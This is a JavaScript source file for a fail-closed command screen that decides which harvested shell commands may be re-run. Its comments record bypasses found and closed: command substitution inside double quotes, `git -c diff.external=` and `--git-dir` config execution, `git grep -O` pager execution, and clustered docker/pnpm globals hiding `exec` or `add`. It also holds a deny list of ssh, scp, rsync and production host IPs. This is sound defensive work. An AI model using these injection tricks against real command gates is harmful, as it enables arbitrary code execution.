#!/usr/bin/env node
// screen.mjs — THE FAIL-CLOSED SCREEN standing between the census and /bin/sh.
//
//   import { screenCommand } from "./screen.mjs";
//   screenCommand("git worktree list")            // { ok: true,  reason: "admitted: …" }
//   screenCommand("bash deploy/site-deploy.sh")   // { ok: false, reason: "not allowlisted: …" }
//
// Charter D29. This module deliberately imports NOTHING from rerun.mjs. That is
// not tidiness — it is the design. `classifySafety` answers a different
// question ("does this command look like it writes?") and answers it with a
// DENYLIST, which rerun.mjs itself says cannot be complete (rerun.mjs:75,
// :121-131: "the verdict it supports is 'no write shape detected', never 'this
// command cannot write'"). Composing the two would let a denylist verdict be
// read as an allowlist verdict, which is precisely the level-skip this epic
// exists to abolish, one layer down in the tooling.
//
// WHY A SCREEN AT ALL. Wave 3's census wants to RE-EXECUTE historical commands
// harvested from other agents' past runs — untrusted input by construction —
// and `runRerun` gates on `classifySafety` (rerun.mjs:420) and then hands the
// survivor to `spawnSync("/bin/sh", ["-c", cmd])` (rerun.mjs:337). Under a
// census, each false-safe is an EXECUTION, not a warning — and three live cycles
// share this checkout while a fourth measures against the deployed build.
//
// THE SIZE OF THE GAP IS RE-DERIVED, NEVER REMEMBERED. An earlier version of
// this comment carried a count of synthetic commands `classifySafety` rated
// SAFE — a number nothing in the tree could reproduce, from a set that no longer
// exists. It is RETIRED, and screen.test.mjs greps both files to keep it
// retired. The replacement is a pair of measurements the suite recomputes on
// every run, both asserted in screen.test.mjs ("the size of the gap is
// RE-DERIVED…"):
//
//   • over DANGER_SET below — commands whose admission is an outage or a
//     corrupted checkout — `classifySafety` admits ALL of them and this screen
//     admits NONE (29/29 vs 0/29 at the time of writing; the test asserts the
//     RATIO against the live set, not a frozen count, so growing DANGER_SET
//     cannot make the claim stale);
//   • over the frozen 651-command corpus, `classifySafety` admits roughly three
//     times what this screen does — 254 (39.0%) here as of wave 5. Only the
//     screen's own number is pinned by the suite; the other belongs to
//     rerun.mjs, so a MARGIN is asserted there and the figure is printed.
//
// THE SCREEN'S REACH MOVES, AND THAT IS NOT A REGRESSION. Waves 2-4 held it at
// exactly 240 because every fix tightened a shape the corpus did not contain.
// Wave 5 ships tightenings AND widenings together (charter D63) and moved it to
// 254: +16 from admitting read-only `sed` and from running the host bound after
// quote masking, −2 from screening environment-assignment prefixes instead of
// discarding them. Both directions are accounted for member-by-member in
// screen.test.mjs rather than absorbed into a count.
//
// Both are re-derivable in one command: `node tooling/grip/screen.mjs --census`
// for the second, `node --test tooling/grip/test/screen.test.mjs` for both.
//
// THREE LAYERS, IN THIS ORDER. The order is the design, not an implementation
// detail:
//
//   (a) HOST BOUND, first and cheapest. Nothing that names a remote host or a
//       remote-execution verb runs, whatever else the command says. This is
//       the layer that protects machines this process has no business touching.
//   (b) ALLOWLIST of heads and sub-verbs, FAILING CLOSED, plus rejection of the
//       shell metacharacters that turn one command into another. An unknown
//       head is REFUSED — `some-novel-binary --do-a-thing` never runs.
//   (c) WRITE SHAPES as SECOND-LAYER defence only, never as the gate. Layer (c)
//       exists to catch a mistake in layer (b)'s allowlist, and it closes the
//       hole rerun.mjs still carries: `cp` is entirely absent from its
//       WRITE_SHAPES (the filesystem rule lists `mkdir|touch|chmod|chown|ln`
//       and omits the one verb that overwrites a file with different content).
//
// THE DIRECTION OF THE ERROR IS THE WHOLE POINT. A wrong allowlist entry costs
// a FALSE REFUSAL — visible immediately, in the reason string, and the census
// simply skips that row. A wrong denylist entry costs a FALSE PERMISSION on a
// command that is about to run against a shared checkout. So the unbounded set
// — every command that could mutate something — gets the conservative default.
//
// TWO RULINGS ARE SETTLED AND NOT RE-LITIGATED HERE:
//   • `git fetch` is REFUSED. It mutates `.git` refs in a checkout three live
//     cycles share.
//   • every `npx` command is REFUSED. npx installs and then executes an
//     arbitrary package.
//
// WHAT THIS MODULE DOES NOT CLAIM. It is not a shell. It does not prove a
// command is harmless; it proves the command's HEAD and SHAPE are on a list
// somebody wrote down, and refuses everything else. `grep` can still read a
// file you would rather it did not, and an allowlisted `mix test` runs test
// code this module never examined. The verdict it supports is "this shape is
// on the list", never "this command is safe".
//
//   node tooling/grip/screen.mjs --census    admission rate over the frozen corpus
//   node tooling/grip/screen.mjs --selftest  the three named sets (D18 controls)
//   node tooling/grip/screen.mjs --verify    both; exit 1 on any miss
//
// Dependency-free. ESM, node: builtins only. No side effect on import.

// ─────────────────────────────────────────────────────────────────────────────
// (a) THE HOST BOUND — checked FIRST among the substantive layers, on the
//     QUOTE-MASKED command
// ─────────────────────────────────────────────────────────────────────────────
//
// IT USED TO BE SCANNED RAW, AND THAT WAS WRONG BY MEASUREMENT. The original
// comment here argued that this is the one layer whose failure mode reaches
// another machine, so it is the one layer that gets no cleverness, and priced
// the over-refusal at "a handful of admissible reads". Wave 5 measured the bill
// instead of estimating it: this wave reads ops docs, and the most quotable line
// in every one of them contains the word `ssh`, so
//
//     cd /x && grep -c "ssh" docs/ops/PROD_OPS.md
//
// was refused as REMOTE EXECUTION. A pattern was read as a target. A screen that
// refuses the honest reads its own operators need does not get made stricter by
// its users — it gets ROUTED AROUND, and then it bounds nothing at all
// (charter D63).
//
// So the host bound now runs on the MASKED string, one step later, and the
// ordering is load-bearing: `doubleQuoteExpansionReason` runs BEFORE it and
// refuses any double-quoted span that sh would expand, so a masked span is a
// span that provably cannot become a command. Masking is not "cleverness" here
// once that guarantee holds — it is the difference between reading a hostname
// and reading the letters h-o-s-t-n-a-m-e.
//
// What is REFUSED is unchanged in the direction that matters: `ssh root@host
// uptime`, `scp`, `rsync`, the two production IPs, guerrilla and barkpark.cloud
// are all still refused when they appear as SYNTAX. Only their appearance as
// QUOTED DATA is now admitted.

export const HOST_BOUND = [
  [/\bssh\b/i, "names ssh (remote execution)"],
  [/\bscp\b/i, "names scp (remote copy)"],
  [/\brsync\b/i, "names rsync (remote sync)"],
  [/157\.180\.90\.121/, "names the guerrilla host by IP (157.180.90.121)"],
  [/178\.105\.92\.191/, "names a production host by IP (178.105.92.191)"],
  [/\bguerrilla\b/i, "names guerrilla"],
  [/barkpark\.cloud/i, "names barkpark.cloud"],
  [/root@/i, "names a root@ remote account"],
];

/** @returns {string|null} why the host bound refuses, or null */
export function hostBoundReason(command) {
  const raw = String(command ?? "");
  for (const [re, why] of HOST_BOUND) if (re.test(raw)) return why;
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// QUOTE MASKING — needed by layers (b) and (c), owned by this file
// ─────────────────────────────────────────────────────────────────────────────
//
// Replaces every quoted span (quote characters included) with `Q` glyphs, 1:1,
// so offsets are preserved and unquoted text — real shell syntax — stays
// byte-identical. `Q` rather than a space because layer (b) tokenizes the
// result, and a blanked span must remain ONE token.
//
// Returns null on an unterminated quote. rerun.mjs falls back to a raw scan
// there; this module REFUSES instead, because a command it cannot parse is a
// command it cannot bound.
//
// The trap that bit rerun.mjs — blanking a quoted span turns `sh -c 'rm -rf /'`
// falsely safe — cannot bite here: every interpreter head (`sh`, `bash`, `node`,
// `python3`, `psql`, `awk`, `perl`, `eval`, `xargs`) is absent from the layer-(b)
// allowlist, so no command whose quoted argument is a program ever reaches a
// masked scan.

// ─────────────────────────────────────────────────────────────────────────────
// THE DOUBLE-QUOTE HOLE — masking is only sound for spans sh cannot expand
// ─────────────────────────────────────────────────────────────────────────────
//
// `maskQuotedSpans` blanked double-quoted spans IDENTICALLY to single-quoted
// ones. For single quotes that is correct — a single-quoted span is inert in
// every POSIX shell. For double quotes it is FALSE, and the falsehood was an
// arbitrary-execution primitive on the census's own supposedly fail-closed path:
//
//     grep -n "$(id > /tmp/DQ_MARK)" .
//
// went through `censusOne` returning screened:true AND executed:true, and wrote
// /tmp/DQ_MARK carrying live `id` output. Every layer below saw `grep -n QQQQ .`
// — an ordinary read. sh saw a command substitution and ran it.
//
// The fix is NOT to refuse quoting. `grep -n "func handle" x.go` is the single
// most ordinary read shape there is, and blanket-refusing double quotes would
// cost most of the census's reach to close a hole with three characters in it.
// The fix is to scan double-quoted spans for the constructs sh EXPANDS there —
// `$(…)` and backticks — and refuse only those. Single-quoted `$( )` stays
// ADMITTED, because it genuinely cannot run.
//
// BOUND, stated honestly: this refuses EXECUTION inside double quotes, not
// EXPANSION. `"$HOME"` and `"${X}"` are still admitted, exactly as bare `$HOME`
// is admitted outside quotes today — `metacharacterReason` has never caught a
// plain parameter expansion either. A variable expands to DATA; a substitution
// expands to the OUTPUT OF A COMMAND THAT RAN. Only the second is this layer's
// business, and the asymmetry is deliberate rather than an oversight.

/** @returns {string|null} why a double-quoted span would execute, or null */
export function doubleQuoteExpansionReason(command) {
  const cmd = String(command ?? "");
  let quote = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (quote === "'") {
      if (ch === "'") quote = null;
      continue;
    }
    if (quote === '"') {
      // Inside double quotes, a backslash escapes `$`, `` ` ``, `"` and `\`.
      if (ch === "\\" && i + 1 < cmd.length) {
        i++;
        continue;
      }
      if (ch === '"') quote = null;
      else if (ch === "$" && cmd[i + 1] === "(") {
        return "command substitution $( ) inside a DOUBLE-quoted span — sh expands it there (only single quotes are inert)";
      } else if (ch === "`") {
        return "command substitution with backticks inside a DOUBLE-quoted span — sh expands it there (only single quotes are inert)";
      }
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    else if (ch === "\\" && i + 1 < cmd.length) i++;
  }
  return null;
}

export function maskQuotedSpans(command) {
  const cmd = String(command ?? "");
  let out = "";
  let quote = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (quote === "'") {
      if (ch === "'") quote = null;
      out += "Q";
    } else if (quote === '"') {
      if (ch === "\\" && i + 1 < cmd.length) {
        out += "QQ";
        i++;
        continue;
      }
      if (ch === '"') quote = null;
      out += "Q";
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      out += "Q";
    } else if (ch === "\\" && i + 1 < cmd.length) {
      out += "QQ";
      i++;
    } else {
      out += ch;
    }
  }
  return quote === null ? out : null;
}

// ─────────────────────────────────────────────────────────────────────────────
// (b1) SHELL METACHARACTERS — the operators that turn one command into another
// ─────────────────────────────────────────────────────────────────────────────
//
// Scanned on the MASKED string, so a metacharacter inside a quoted argument is
// data. `2>&1` and `>/dev/null` are the two redirections that discard rather
// than write, and both are admitted; every other `>` creates or truncates a
// file. `|` and `&&` and `||` are NOT rejected — they are SPLIT, and every
// segment is screened independently. A pipeline is only as admissible as its
// least admissible member.

const FD_DUP = /(\d?)>&(\d)/g; // 2>&1, >&2 — a dup, not a write
const DISCARD_REDIRECT = />>?\s*\/dev\/(null|stderr|stdout)\b/g;

export function metacharacterReason(masked) {
  // Neutralise the two admitted redirection forms before looking for the rest.
  const m = masked.replace(FD_DUP, (s) => "Q".repeat(s.length)).replace(DISCARD_REDIRECT, (s) => "Q".repeat(s.length));

  if (/\$\(/.test(m)) return "command substitution $( )";
  if (/`/.test(m)) return "command substitution with backticks";
  if (/<\(/.test(m)) return "process substitution <( )";
  if (/>\(/.test(m)) return "process substitution >( )";
  if (/[\n\r]/.test(m)) return "newline (multiple commands)";
  if (/;/.test(m)) return "command sequencing ;";
  if (/>/.test(m)) return "output redirection to a file";
  if (/</.test(m)) return "input redirection";
  // A bare `( … )` is a SUBSHELL — a whole second command list, and the head of
  // the outer segment says nothing about what runs inside it. Found by auditing
  // the ADMITTED side of the corpus, not the refused side: several rows carried
  // trailing prose in parentheses and sailed through on their allowlisted head.
  if (/[()]/.test(m)) return "subshell or unbalanced parenthesis ( )";
  // A surviving `&` is a background job or an unpaired fd dup; `&&` is a list
  // separator and is SPLIT rather than refused.
  if (/&/.test(m.replace(/&&/g, "QQ"))) return "background job or unpaired &";
  return null;
}

/** Split a command into pipeline/list segments at UNQUOTED `|`, `&&`, `||`. */
export function splitSegments(raw, masked) {
  const m = masked.replace(FD_DUP, (s) => "Q".repeat(s.length));
  const parts = [];
  let start = 0;
  for (let i = 0; i < m.length; i++) {
    const ch = m[i];
    if (ch !== "|" && ch !== "&") continue;
    const len = m[i + 1] === ch ? 2 : 1;
    parts.push(raw.slice(start, i));
    start = i + len;
    i += len - 1;
  }
  parts.push(raw.slice(start));
  return parts.map((s) => s.trim()).filter((s) => s.length > 0);
}

/** Quote-aware tokenizer. Quotes are stripped; the span stays one token. */
export function tokenize(segment) {
  const s = String(segment ?? "");
  const out = [];
  let cur = "";
  let has = false;
  let quote = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) quote = null;
      else if (quote === '"' && ch === "\\" && i + 1 < s.length) cur += s[++i];
      else cur += ch;
      has = true;
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      has = true;
    } else if (/\s/.test(ch)) {
      if (has) out.push(cur);
      cur = "";
      has = false;
    } else {
      cur += ch;
      has = true;
    }
  }
  if (has) out.push(cur);
  return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// (b2) THE ALLOWLIST — heads, and sub-verbs where the head is not enough
// ─────────────────────────────────────────────────────────────────────────────
//
// A Map, not an object literal, on purpose. Wave 2's review found the ten-name
// verdict vocabulary leaking through Object.prototype: a bare index on an object
// resolved `toString` / `constructor` / `__proto__` as if they were entries, so
// the guard written to keep a set closed was the one place it failed open. A
// Map has no prototype chain to inherit from.

const arg = (argv, i) => (i < argv.length ? argv[i] : null);
const firstNonFlag = (argv, from = 1) => argv.slice(from).find((t) => !t.startsWith("-")) ?? null;
const hasFlag = (argv, ...flags) => argv.some((t) => flags.includes(t));

// ── VALUE-TAKING GLOBALS — the token a global option EATS is not the sub-verb ──
//
// `firstNonFlag` skips flag TOKENS but does not model that some globals consume
// their NEXT token as a value. `git -C log push` is `git push` run in a
// directory named `log` — `-C` eats `log`, and the real sub-verb is `push`. The
// original `firstNonFlag` returned `log`, so `gitRule` judged a WRITE as the
// read-verb `log` and ADMITTED it. The same hole rode `go -C env run main.go`
// (code execution) and `npm --prefix ls install` (postinstall code execution)
// because `goRule`/`npmRule` derive their sub-verb the same way.
//
// The fix is ONE normaliser, not a per-tool hand-copy of the grammar (five
// hand-copies of one grammar drifting apart is this epic's own named defect
// class). It consumes value-taking globals — and, in the SEPARATE-value
// spelling, the value token they eat — ONLY in the PRE-VERB region, then stops
// at the first bare token and preserves everything from the sub-verb onward
// verbatim. The pre-verb restriction is load-bearing: the same letters mean
// different things AFTER the verb (`git branch -C old new` COPIES a branch — a
// write — and `-C` there must reach the write-flag guard, not be stripped). The
// `--flag=value` spelling is a single token that already starts with `-`, so it
// stays a flag token that `firstNonFlag` skips; only the separate spelling
// leaves a bare value that needs eating. The head at argv[0] is preserved so the
// `<head> <verb> <sub-verb>` positions the sub-verb guards read are unchanged.

// SHORT GLOBALS CLUSTER, AND EXACT-TOKEN COMPARISON CANNOT SEE IT.
//
// `valueGlobals.has(t)` is an EXACT token match, so it catches `-c` and misses
// `-Dc` — and every one of these tools clusters. Proven live on this host:
//
//     docker -Dc ps version   → ate `ps` as the CONTEXT, then ran `docker version`
//     docker -Dl ps version   → ate `ps` as the LOG LEVEL
//     pnpm  -rC ls root       → ate `ls` as the DIRECTORY, then ran `pnpm root`
//
// Substitute the harmless tail for `exec -it foo bash` / `add lodash` and the
// screen admits arbitrary code execution: the eaten value is read as the
// sub-verb, and the real verb one token further right is never examined. This is
// the SAME defect #13346 fixed for the unclustered spelling, one cluster
// character along — exactly how `curl -o` → `curl -so` went (see
// `normaliseArgv`, whose comment names that history).
//
// getopt/pflag both bind a cluster the same way: the FIRST value-taking letter
// in `-abc` consumes the REST OF THE CLUSTER as its value, and only consumes the
// NEXT TOKEN when it is the cluster's last letter. So `-Dc ps` eats `ps`;
// `-Dcps` does not (its value is the attached `ps`), and neither does a cluster
// with no value-taking letter in it at all.
//
// The letters come from `valueGlobals` itself — every `-x` member contributes
// `x` — so a head that declares a short global gets its clustered spelling for
// free and the two can never drift apart.

/** @param {Set<string>} valueGlobals @returns {Set<string>} the short letters in it */
const shortValueLetters = (valueGlobals) =>
  new Set([...valueGlobals].filter((g) => /^-[A-Za-z]$/.test(g)).map((g) => g[1]));

/**
 * Does this pre-verb token eat the NEXT token as its value?
 *
 * @param {string} t
 * @param {Set<string>} valueGlobals
 * @param {Set<string>} letters
 */
function eatsNextToken(t, valueGlobals, letters) {
  if (valueGlobals.has(t)) return true;
  if (!/^-[A-Za-z]{2,}$/.test(t)) return false; // long flag, `--flag=value`, or an attached-value cluster
  const cluster = [...t.slice(1)];
  const at = cluster.findIndex((ch) => letters.has(ch));
  return at === cluster.length - 1; // value-taking letter LAST → the value is the next token
}

/**
 * @param {string[]} argv
 * @param {Set<string>} valueGlobals global option tokens that eat their next token
 * @returns {string[]}
 */
function dropValueGlobals(argv, valueGlobals) {
  if (!argv.length) return argv;
  const letters = shortValueLetters(valueGlobals);
  const out = [argv[0]];
  let i = 1;
  for (; i < argv.length; i++) {
    const t = argv[i];
    if (eatsNextToken(t, valueGlobals, letters)) {
      i++; // eat this global AND the separate value token it consumes
      continue;
    }
    if (t.startsWith("-")) {
      out.push(t); // some other pre-verb flag (incl. the `--flag=value` spelling)
      continue;
    }
    break; // first bare token — the sub-verb; everything from here is verbatim
  }
  for (; i < argv.length; i++) out.push(argv[i]);
  return out;
}

const EMPTY_VALUE_GLOBALS = new Set();

// ─────────────────────────────────────────────────────────────────────────────
// THE WRITE-VERB BACKSTOP — because a value-global set can never be COMPLETE
// ─────────────────────────────────────────────────────────────────────────────
//
// Every fix above is an ENUMERATION: "these tokens eat their neighbour." Three
// separate waves have now enumerated that set for docker/pnpm/npm/systemctl and
// three times the enumeration was SHORT — #13346 shipped docker with four of its
// seven value-taking globals, and this wave found `-c`, `-l`/`--log-level`,
// `--tlscacert`, `--tlscert` and `--tlskey` still admitting `docker exec`
// (`docker --tlscacert ps version` RAN `docker version` on this host — the value
// was eaten and the real verb executed). An enumeration whose every past revision
// was incomplete is not a thing to complete once more and trust; it is a thing to
// put a SECOND LAYER under.
//
// So each of these heads also carries the set of its own verbs that WRITE or
// EXECUTE, and any of them appearing ANYWHERE in argv refuses — the sub-verb
// allowlist stays the gate, this is the catch. It is deliberately the same
// belt-and-braces shape `ghRule` (GH_WRITE_VERBS) and `bpRule` (BP_WRITE_VERBS)
// already use, and for the identical stated reason. Its value is that a
// value-global this wave ALSO missed can no longer hide `restart`, `exec` or
// `add` — the dangerous verb is still a bare token in the command, wherever the
// parser thinks the sub-verb is.
//
// The cost is a false refusal on a read whose ARGUMENT happens to be spelled
// like a write verb (`systemctl status restart`, a unit literally named
// `restart`). That is the direction this module is allowed to be wrong in, and
// NEVER_CRY_WOLF_SET bounds how far.

/** @param {string[]} argv @param {Set<string>} writeVerbs @param {string} head */
function writeVerbBackstop(argv, writeVerbs, head) {
  for (let i = 1; i < argv.length; i++) {
    if (writeVerbs.has(argv[i])) {
      return `${head} names the write/exec verb "${argv[i]}" — refused wherever it sits, because a value-taking global can hide it in the sub-verb position`;
    }
  }
  return null;
}

/**
 * A head whose sub-verb must appear in `verbs`.
 *
 * `valueGlobals` (optional) is a Set of pre-verb global option tokens that eat
 * their next token as a value — the same `dropValueGlobals` normaliser gitRule
 * / goRule / npmRule use. Without it, `firstNonFlag` reads the EATEN VALUE as
 * the sub-verb: `pnpm -C ls add lodash` and `pnpm --prefix ls install` both
 * ADMITTED (`add`/`install` are writes/code-exec, judged as the read verb
 * `ls`), and `docker --host ps exec -it foo bash` ADMITTED docker exec
 * (arbitrary code execution in a container) because `--host` ate `ps`, which
 * happens to be an allowed docker verb, and the real verb `exec` was never
 * looked at.
 */
const verbRule = (verbs, label, valueGlobals = EMPTY_VALUE_GLOBALS, writeVerbs = EMPTY_VALUE_GLOBALS) => ({
  verbs: new Set(verbs),
  check(rawArgv) {
    const argv = valueGlobals.size ? dropValueGlobals(rawArgv, valueGlobals) : rawArgv;
    const verb = firstNonFlag(argv);
    if (verb === null) return `${argv[0]} without a sub-verb — ${label} requires one of: ${[...verbs].sort().join(", ")}`;
    if (!this.verbs.has(verb)) return `${argv[0]} sub-verb "${verb}" is not on the read-only allowlist (${[...verbs].sort().join(", ")})`;
    // SECOND LAYER — see writeVerbBackstop. Runs over the RAW argv, because the
    // whole point is to see a verb the pre-verb normaliser mis-sited.
    return writeVerbs.size ? writeVerbBackstop(rawArgv, writeVerbs, label) : null;
  },
});

/** A head that reads and takes no dangerous flag. */
const plainRule = () => ({ check: () => null });

const GIT_READ_VERBS = [
  "show", "log", "diff", "status", "rev-parse", "rev-list", "cat-file", "ls-files", "ls-tree",
  "merge-base", "describe", "blame", "shortlog", "grep", "count-objects", "worktree", "remote",
  "config", "stash", "branch", "tag", "show-ref", "for-each-ref", "check-ignore", "whatchanged",
];

const GIT_SUBVERB_GUARDS = new Map([
  // `git worktree list` reads; `git worktree add/remove/prune` mutates the shared checkout.
  ["worktree", (argv) => (firstNonFlag(argv, 2) === "list" ? null : "git worktree may only be used as `git worktree list`")],
  ["remote", (argv) => {
    const sub = firstNonFlag(argv, 2);
    if (sub === null || sub === "show") return null;
    return `git remote sub-verb "${sub}" is not read-only (only \`git remote -v\` / \`git remote show\`)`;
  }],
  ["config", (argv) => (hasFlag(argv, "--get", "--get-all", "--get-regexp", "--list", "-l") ? null : "git config may only be used with --get/--get-all/--get-regexp/--list")],
  ["stash", (argv) => (firstNonFlag(argv, 2) === "list" ? null : "git stash may only be used as `git stash list`")],
  ["tag", (argv) => (firstNonFlag(argv, 2) === null || hasFlag(argv, "-l", "--list") ? null : "git tag may only LIST (`git tag -l`); creating or deleting a tag is a write")],
]);

// Branch/tag deletion flags are a write in any position.
const GIT_WRITE_FLAGS = ["-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy", "--edit-description"];

// git's value-taking GLOBAL options — the ones that precede the sub-verb and eat
// their next token. `git -C log push` is a WRITE whose sub-verb is `push`, not
// the eaten value `log`. `-c` is included though the brief's set is 8 without it:
// `git -c log push` eats `log` identically, and `git -c core.pager=cat log` was
// FALSELY REFUSED before (its bare `core.pager=cat` value read as the sub-verb).
const GIT_VALUE_GLOBALS = new Set([
  "-C", "-c", "--git-dir", "--work-tree", "--namespace",
  "--exec-path", "--super-prefix", "--attr-source", "--config-env",
]);

// `git -c <key>=<value>` IS `GIT_EXTERNAL_DIFF=`, SPELLED AS A FLAG.
//
// envAssignmentReason refuses `GIT_EXTERNAL_DIFF=./evil.sh git diff` by name,
// and DANGER_SET carries that row. `git -c diff.external=/tmp/evil.sh diff` is
// the identical capability, and it was ADMITTED — proven on this host, writing
// /tmp/GIT_XDIFF_MARK with live `id` output. Worse, `-c` is a member of
// GIT_VALUE_GLOBALS, so the normaliser that closed the sub-verb collision EATS
// the key=value pair and guarantees nothing ever looks at it.
//
// git config has dozens of keys whose value is a command git runs (`alias.*`
// with `!`, `core.editor`, `core.sshCommand`, `core.fsmonitor`, `core.hooksPath`,
// `credential.helper`, `filter.*.clean|smudge|process`, `diff.*.textconv`,
// `difftool.*.cmd`, `merge.*.driver`, `uploadpack.packObjectsHook`,
// `gpg.program`, `init.templateDir`, `trailer.*.command`, `web.browser`, …).
// Denylisting them is the shape that has failed four times elsewhere in this
// file, so `-c` gets an ALLOWLIST of inert display keys instead — the same
// fail-closed choice ALLOWED_HEADS itself is.
//
// `core.pager` is admitted ONLY as `cat`. The tgw12-s1 comment on
// GIT_VALUE_GLOBALS names `git -c core.pager=cat log` as a row its fix
// un-refused, so that exact row survives; every other pager value is a program,
// and `GIT_PAGER=` is already a DANGER_SET row. (Measured while proving this:
// git does NOT run the pager when stdout is not a terminal, even under `-p` —
// so this key is the one row here resting on git's documented behaviour rather
// than an observed execution. Stated, not implied.)
//
// REACH COST: 0 of the 651 frozen corpus commands use `git -c` at all.
const GIT_INERT_CONFIG = new Map([
  ["core.pager", new Set(["cat"])],
  ["color.ui", null], ["color.diff", null], ["color.status", null], ["color.branch", null],
  ["core.quotepath", null], ["core.abbrev", null], ["core.autocrlf", null],
  ["log.date", null], ["diff.noprefix", null], ["diff.renames", null],
  ["safe.directory", null], ["i18n.logoutputencoding", null], ["advice.detachedhead", null],
]);

/** @returns {string|null} why a `-c key=value` / `--config-env key=VAR` pair is refused */
function gitConfigPairReason(pair) {
  const at = String(pair).indexOf("=");
  if (at < 0) return `git -c ${pair} is not a key=value pair — the screen cannot bound what it sets`;
  const key = pair.slice(0, at).toLowerCase();
  const value = pair.slice(at + 1);
  if (!GIT_INERT_CONFIG.has(key)) {
    return `git -c ${key}= is not on the inert config allowlist (${[...GIT_INERT_CONFIG.keys()].sort().join(", ")}) — keys like diff.external, alias.*, core.sshCommand and filter.*.clean name a PROGRAM git RUNS, which voids the head allowlist exactly as GIT_EXTERNAL_DIFF= does`;
  }
  const values = GIT_INERT_CONFIG.get(key);
  if (values && !values.has(value)) {
    return `git -c ${key}=${value} names a PROGRAM git runs; only ${[...values].join(", ")} is admitted for this key`;
  }
  return null;
}

// `git -c` GOT AN ALLOWLIST; `git --git-dir=` HANDS GIT A WHOLE CONFIG FILE.
//
// The block above allowlists `-c <key>=<value>` down to fourteen inert display
// keys, because "git config has dozens of keys whose value is a command git
// runs". `--git-dir` names a repository whose `config` file may set EVERY ONE OF
// THEM, and nothing read it. Proven on the authoring host — no `-c` anywhere in
// the command:
//
//     $ git -C $B/evilrepo config core.fsmonitor $B/evil/fsmon
//     $ git --git-dir=$B/evilrepo/.git --work-tree=$B/evilrepo status --short
//     $ cat /tmp/GRIP_E4_MARK
//     PWNED-E4 fsmonitor argv=2 1787567592111742000
//
// `status` is on GIT_READ_VERBS, `core.fsmonitor` is a program git runs
// automatically, and `screenCommand` returned ok. `GIT_DIR=` is already refused
// by `envAssignmentReason`, by name — so this is once more the ENV spelling
// screened and the FLAG spelling not, the pattern this file has now paid for
// five times.
//
// `--exec-path` is refused ON PARITY AND DOCUMENTATION, NOT on an observed
// execution, and the distinction is stated rather than implied: git(1)
// documents it as the path git searches for its sub-programs and prepends to
// PATH for the subprocesses it spawns, and `GIT_EXEC_PATH=` is refused by name
// one layer up. It was TESTED here and did NOT execute a planted `git-log`
// (git dispatches its builtins internally before consulting exec-path), so the
// claim made is parity, and nothing stronger.
//
// `--work-tree` and `--namespace` are NOT refused: neither names a file git
// reads settings from, and refusing them would be cry-wolf.
//
// REACH COST, MEASURED: 0 of the 651 frozen corpus commands use `--git-dir` or
// `--exec-path` in any spelling.
const GIT_CONFIG_SOURCE_FLAGS = new Map([
  ["--git-dir", "names a REPOSITORY whose `config` the screen never reads — it may set core.fsmonitor, core.pager, alias.*, diff.external or any other key naming a PROGRAM git runs (proven: core.fsmonitor executed under an allowlisted `git status`)"],
  ["--exec-path", "sets the directory git searches for its sub-programs and prepends to PATH for the subprocesses it spawns — the flag spelling of `GIT_EXEC_PATH=`, which `envAssignmentReason` already refuses by name (refused on PARITY and git(1), not on an observed execution)"],
]);

const gitRule = {
  check(rawArgv) {
    // BEFORE the normaliser eats them: `-c` and `--config-env` carry the pair,
    // and the config-SOURCE flags carry a path. Both spellings for each, because
    // comparing tokens exactly is how `--server=` walked past the loopback bound.
    for (let i = 1; i < rawArgv.length; i++) {
      const t = rawArgv[i];
      const name = t.split("=")[0];
      if (GIT_CONFIG_SOURCE_FLAGS.has(name)) return `git ${name} ${GIT_CONFIG_SOURCE_FLAGS.get(name)}`;
      const pair = t === "-c" || t === "--config-env" ? arg(rawArgv, i + 1) : /^--config-env=/.test(t) ? t.slice("--config-env=".length) : null;
      if (pair === null) continue;
      const why = gitConfigPairReason(pair);
      if (why) return why;
    }
    const argv = dropValueGlobals(rawArgv, GIT_VALUE_GLOBALS);
    const verb = firstNonFlag(argv);
    if (verb === null) return "git without a sub-verb";
    if (!GIT_READ_VERBS.includes(verb)) {
      const why =
        verb === "fetch"
          ? "git fetch mutates .git refs in a checkout three live cycles share (settled ruling)"
          : `git sub-verb "${verb}" is not on the read-only allowlist`;
      return why;
    }
    if ((verb === "branch" || verb === "tag") && hasFlag(argv, ...GIT_WRITE_FLAGS)) {
      return `git ${verb} with a delete/move flag is a write`;
    }
    // `--output` redirects git's own stdout INTO A FILE, on read verbs this rule
    // otherwise admits — `git log --output=/tmp/x` and `git log --output /tmp/x`
    // both create real files. Both spellings, because comparing tokens exactly is
    // how `--server=` walked past the loopback bound one rule down.
    const out = argv.find((t, i) => i > 0 && (t === "--output" || /^--output=/.test(t)));
    if (out) return `git ${out} WRITES git's output to a file rather than stdout`;
    // `git grep -O <cmd>` RUNS <cmd>, and `grep` is on the read allowlist.
    //
    // The PROGRAM INDIRECTION block below closed `rg --pager`, `ag --pager` and
    // `ack --pager` — "a flag whose VALUE is a PROGRAM the tool will run". git's
    // own grep has the identical flag under a different name and it was never
    // swept, because the sweep was organised by HEAD (`rg`, `ag`, `ack`) and git
    // is filed under its sub-verb rule. Both spellings proven on the authoring
    // host, each running a planted script with every matching file as argv:
    //
    //     git grep -O<cmd> -l screenCommand -- tooling/grip
    //     git grep --open-files-in-pager=<cmd> -l screenCommand -- tooling/grip
    //     $ cat /tmp/GRIP_E2_MARK
    //     PWNED-E2 git-grep-O pager argv=tooling/grip/acceptance.mjs …
    //
    // The `-O` test is `[A-Za-z]*O` rather than an exact token because git's
    // parse-options CLUSTERS: `-lO<cmd>` binds <cmd> to `O` exactly as `-so`
    // bound curl's output file. Scoped to `grep`, because `-O` on `git diff` is
    // `--orderfile`, which READS. `grep` is the only read verb whose `-O` runs
    // anything, so this costs nothing elsewhere.
    //
    // REACH COST, MEASURED: 0 of the 651 frozen corpus commands use either.
    if (verb === "grep") {
      const pager = argv.find((t, i) => i > 0 && (/^-[A-Za-z]*O/.test(t) || /^--open-files-in-pager\b/.test(t)));
